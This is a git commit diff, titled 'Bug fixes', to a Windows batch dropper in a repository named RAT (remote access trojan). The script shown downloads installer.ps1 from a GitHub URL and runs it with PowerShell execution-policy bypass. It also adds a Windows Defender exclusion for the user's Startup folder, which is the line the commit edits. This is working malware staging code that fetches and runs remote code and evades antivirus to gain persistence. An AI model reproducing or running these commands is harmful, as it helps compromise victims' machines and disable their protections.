715e00792353e8d9f424d4df36849c283c16538b
riahifiras <120566908+riahifiras@users.noreply.github.com>
2024-04-13 18:01:50 +0100

    Bug fixes.

--- files/wget.cmd
+++ files/wget.cmd
@@ -40,7 +40,7 @@ REM rat ressources
 powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/installer.ps1 -OutFile installer.ps1";
 
 
-Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
+Add-MpPreference -ExclusionPath "C:\Users\user\%username%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
 
 powershell -ep bypass -c "./installer.ps1"
 
